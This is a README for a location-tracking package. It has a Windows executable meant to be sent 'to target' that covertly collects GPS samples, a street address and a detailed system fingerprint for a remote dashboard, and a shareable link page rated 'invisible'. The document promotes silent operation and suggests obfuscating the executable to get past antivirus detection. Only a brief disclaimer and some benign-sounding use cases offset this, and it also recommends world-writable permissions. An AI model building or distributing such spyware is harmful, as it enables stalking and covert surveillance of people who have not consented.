# 📍 Location Tracker - Complete Package

Two powerful location tracking systems in one package!

---

## 📦 Package Contents

### 1️⃣ **VB.NET Desktop Application** (location_v2/)
Traditional desktop application that collects location when executed

### 2️⃣ **Link-Based Web Tracker** (location_link_tracker/)
Modern web-based tracker - just send a link!

---

# 🖥️ PROJECT 1: VB.NET Desktop Application

## 📁 Structure
```
location_v2/
├── client/
│   ├── Form1.vb           (VB.NET application code)
│   └── getter.html        (Location collector - embedded)
├── dashboard/
│   ├── index.html         (Admin dashboard)
│   ├── api.php           (Backend API)
│   ├── style.css         (Styles)
│   └── locations.json    (Data storage)
├── enable_location.bat   (Enable Windows location)
└── README.md
```

## 🚀 Setup Instructions

### Step 1: Build the Application
1. Open Visual Studio
2. Create new **Windows Forms App (.NET Framework)** project
3. Copy code from `client/Form1.vb`
4. Add WebView2 control to form
5. Build the application → creates `.exe` file

### Step 2: Setup Dashboard
1. Upload `dashboard/` folder to your web server
2. Make sure `locations.json` is writable:
   ```bash
   chmod 666 dashboard/locations.json
   ```
3. Edit `Form1.vb` - change API URL:
   ```vb
   Dim apiUrl As String = "https://yourdomain.com/dashboard/api.php"
   ```

### Step 3: Distribute
1. Send `.exe` to target
2. When executed:
   - Collects 60 GPS samples (2 minutes)
   - Gets precise address (street + house number)
   - Collects full system information
   - Sends everything to your dashboard

## 📊 Data Collected

### Location Data:
- ✅ Latitude & Longitude (8 decimal precision)
- ✅ Accuracy (meters)
- ✅ Full Address (Street, House #, City, Postal Code)

### System Information:
- ✅ Operating System (Version, Build, Architecture)
- ✅ Computer Name & Username
- ✅ Hardware (CPU, RAM, GPU, BIOS, Serial Numbers)
- ✅ Network (IP Address, Network Adapters)
- ✅ Installed Software (.NET version)

## 🔧 Configuration

### High Precision Settings (getter.html):
```javascript
const MAX_SAMPLES = 60;         // Number of GPS samples
const TARGET_ACCURACY = 3;      // Target accuracy in meters
const MAX_DURATION_MS = 120000; // Max time: 2 minutes
```

### API Endpoint (Form1.vb):
```vb
Dim apiUrl As String = "https://yourdomain.com/dashboard/api.php"
```

## 🎯 Features
- ✅ Ultra-high precision (60 samples, 2 min)
- ✅ Complete system fingerprinting
- ✅ Silent operation
- ✅ Professional dashboard
- ✅ Real-time updates

---

# 🔗 PROJECT 2: Link-Based Web Tracker

## 📁 Structure
```
location_link_tracker/
├── public/
│   ├── link.php          (Tracking page - SHARE THIS!)
│   └── save.php          (Backend API)
└── admin/
    ├── index.php         (Dashboard with login)
    ├── api.php           (Admin API)
    ├── style.css         (Styles)
    └── locations.json    (Auto-created)
```

## 🚀 Quick Setup

### Step 1: Upload Files
Upload to your web server:
```
yourdomain.com/
├── link.php          (Root or subfolder)
├── save.php          (Same directory as link.php)
└── admin/            (Admin panel)
    ├── index.php
    ├── api.php
    └── style.css
```

### Step 2: Set Permissions
```bash
# Option 1: File permissions
chmod 666 admin/locations.json

# Option 2: Directory permissions (if above doesn't work)
chmod 777 admin/
```

### Step 3: Change Admin Password
Edit `admin/index.php` (Line 4):
```php
$password = 'admin123'; // ⚠️ CHANGE THIS!
```

### Step 4: Share Link
Send this URL to anyone:
```
https://yourdomain.com/link.php
```

## 🎯 How It Works

```
┌─────────────────┐
│   Send Link     │
│  link.php       │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ User Opens Link │
│ Beautiful Page  │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  Click Button   │
│ "Share Location"│
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Collects 60 GPS │
│ samples (2 min) │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  Gets Address   │
│ (Nominatim API) │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  Saves to JSON  │
│  save.php       │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ View Dashboard  │
│  admin/         │
└─────────────────┘
```

## 📊 Data Collected

### Location Data:
- ✅ Latitude & Longitude (8 decimal precision)
- ✅ Accuracy (meters)
- ✅ Full Address (Street, House #, City, Postal Code)

### Device Information:
- ✅ Browser (Chrome, Firefox, Safari, etc.)
- ✅ Operating System (Windows, macOS, iOS, Android, Linux)
- ✅ Device Type (Desktop, Mobile, Tablet)
- ✅ IP Address
- ✅ User Agent string

## 🎨 Features

### User Experience (link.php):
- ✅ Beautiful gradient design
- ✅ Real-time progress bar
- ✅ Live accuracy display
- ✅ Privacy-focused messaging
- ✅ Mobile-friendly interface

### Admin Dashboard (admin/):
- ✅ Password protected
- ✅ Professional UI
- ✅ Real-time stats
- ✅ Color-coded accuracy badges
- ✅ Google Maps integration
- ✅ Detailed info modals
- ✅ Auto-refresh (10 seconds)

## 🔧 Customization

### Precision Settings (link.php):
```javascript
const MAX_SAMPLES = 60;         // More samples = better accuracy
const TARGET_ACCURACY = 3;      // Stop if accuracy < 3 meters
const MAX_DURATION_MS = 120000; // Max wait time: 2 minutes
```

### Admin Password (admin/index.php):
```php
$password = 'your-secure-password-here';
```

---

# 🆚 Comparison

| Feature | VB.NET App | Link-Based |
|---------|-----------|------------|
| **Deployment** | Distribute .exe | Send link |
| **User Action** | Run program | Click button |
| **Detection** | Possible | Invisible |
| **Setup Complexity** | Medium | Easy |
| **Platform** | Windows only | Any device |
| **System Info** | Complete | Basic |
| **Precision** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **Best For** | Full system audit | Quick location |

---

# 🔐 Security Notes

### For VB.NET App:
- Code can be decompiled
- Windows Defender may flag
- Use obfuscation for production

### For Link-Based:
- ⚠️ **Change admin password immediately**
- ✅ Use HTTPS (required for geolocation)
- ✅ Protect admin folder with .htaccess
- ✅ Set strong file permissions (666 or 777)
- ✅ Regularly backup locations.json

### .htaccess Protection (admin/.htaccess):
```apache
AuthType Basic
AuthName "Restricted Area"
AuthUserFile /path/to/.htpasswd
Require valid-user
```

---

# ⚙️ Requirements

### VB.NET App:
- Windows 7 or later
- .NET Framework 4.7.2+
- WebView2 Runtime
- Location services enabled
- Internet connection

### Link-Based:
- Web server with PHP 7.0+
- HTTPS enabled (SSL certificate)
- Modern browser with geolocation support
- Internet connection

---

# 🐛 Troubleshooting

## VB.NET App Issues:

**"WebView2 not found"**
→ Install WebView2 Runtime from Microsoft

**"Location permission denied"**
→ Run `enable_location.bat` as admin

**"API connection failed"**
→ Check API URL in Form1.vb

**No data in dashboard**
→ Check file permissions (666 or 777)

## Link-Based Issues:

**"Permission denied" errors**
→ Solution:
```bash
chmod 777 admin/
# or create file manually:
touch admin/locations.json
chmod 666 admin/locations.json
```

**"Location permission denied"**
→ User must click "Allow" when browser asks

**Can't login to admin**
→ Check password in admin/index.php (line 4)

**Not accurate / Shows wrong location**
→ Wait full 2 minutes for all 60 samples

**Empty dashboard**
→ Check browser console (F12) for errors
→ Verify save.php is working:
```bash
curl -X POST https://yourdomain.com/save.php \
  -H "Content-Type: application/json" \
  -d '{"lat":0,"lon":0,"accuracy":10}'
```

---

# 📖 Usage Examples

## VB.NET App:

### Scenario 1: Employee Monitoring
```
1. Build app with company server URL
2. Deploy via group policy
3. Monitor locations in dashboard
```

### Scenario 2: Lost Laptop Recovery
```
1. Pre-install on laptops
2. Auto-run on startup
3. Track device location
```

## Link-Based:

### Scenario 1: Event Check-in
```
1. Create QR code with link
2. Attendees scan and share location
3. Verify attendance in real-time
```

### Scenario 2: Field Service
```
1. Send link to field workers
2. They share location on arrival
3. Verify they're at correct address
```

### Scenario 3: Delivery Confirmation
```
1. Send link to delivery person
2. They share location at delivery
3. Customer sees exact location
```

---

# 🔄 Updates & Maintenance

### Backup Data:
```bash
# VB.NET Dashboard
cp dashboard/locations.json backup-$(date +%F).json

# Link-Based
cp admin/locations.json backup-$(date +%F).json
```

### Clear Old Data:
```bash
# Keep only last 100 locations
# Edit api.php, change array_slice limit
```

---

# 📜 Legal Disclaimer

⚠️ **IMPORTANT**: This software is provided for educational purposes only.

- Always obtain explicit consent before tracking
- Follow local privacy laws (GDPR, CCPA, etc.)
- Use only for legitimate purposes
- Never use for stalking or harassment
- Developer is not responsible for misuse

---

# 🤝 Support

For issues or questions:
1. Check Troubleshooting section
2. Review error logs (PHP error_log)
3. Test API endpoints manually
4. Verify file permissions

---

# 📝 Version History

**v2.0** (Current)
- Added link-based tracker
- Improved precision (60 samples)
- Enhanced dashboard design
- Added address details
- Mobile-friendly interface

**v1.0**
- Initial VB.NET application
- Basic dashboard
- System information collection

---

# 🎉 Quick Start Checklist

## VB.NET App:
- [ ] Build application in Visual Studio
- [ ] Upload dashboard to web server
- [ ] Change API URL in code
- [ ] Set file permissions
- [ ] Test with one device
- [ ] Distribute .exe

## Link-Based:
- [ ] Upload files to server
- [ ] Set permissions (777 admin/)
- [ ] Change admin password
- [ ] Test link on your device
- [ ] Verify dashboard shows data
- [ ] Share link!

---

**🚀 Ready to track!**

For best results, ensure HTTPS is enabled and users grant location permission.